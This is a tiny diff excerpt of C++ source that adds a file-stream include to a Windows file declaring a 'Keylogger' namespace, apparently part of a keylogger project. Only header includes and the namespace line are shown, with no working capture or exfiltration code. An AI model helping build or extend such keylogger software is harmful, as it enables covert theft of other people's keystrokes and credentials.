@@ -3,6 +3,7 @@
 #include "../utils.h"
 #include "../crypto.h"
 #include <windows.h>
+#include <fstream>
 #include <sstream>
 
 namespace Keylogger {
